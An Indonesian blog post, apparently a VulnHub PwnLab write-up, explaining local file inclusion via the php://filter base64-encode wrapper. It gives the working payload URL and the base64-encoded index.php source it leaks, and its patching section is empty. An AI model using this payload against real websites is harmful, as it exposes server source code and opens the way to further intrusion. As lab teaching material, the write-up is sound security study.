---
layout: post
title:  "LFI php://filter"
date:   2016-12-04 13:42:00 +0700
categories: vulnhub pwnlab
comments: false
---

Jenis jenis LFI muncul dalam berbagai jenis terutama pada contoh kasus ini target mematikan mod allow_url_include dan dibanding menggunakan include, target menggunakan require_once dan script harus di append menggunakan .php extension pada akhir file. 

jadi mau bagaimanapun dicoba exploit basic LFI, bakal muncul return null, dikarenakan dia menggunaakn require_once dan script di append paksa dengan akhir ekstension .php

contoh

```python
http://target.web/page=index
```

dimana target mempunyai valid file

```python
http://target.web/index.php
```

jadi bagaimana buat solve masalah ini ?

sebelumnya harus di penuhi beberapa kebutuhan ini :

1. File harus valid PHP syntax
2. file yang di load harus mempunyai akhiran ekstensi PHP

so untuk load file index.php pake

```python
php://filter/convert.base64-encode/resource=index
```

jadi nya kek gini

```python
http://target.web/page=php://filter/convert.base64-encode/resource=index
```

bisa return

```python
PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=

```


## How to patch this Hole ?

## Refference
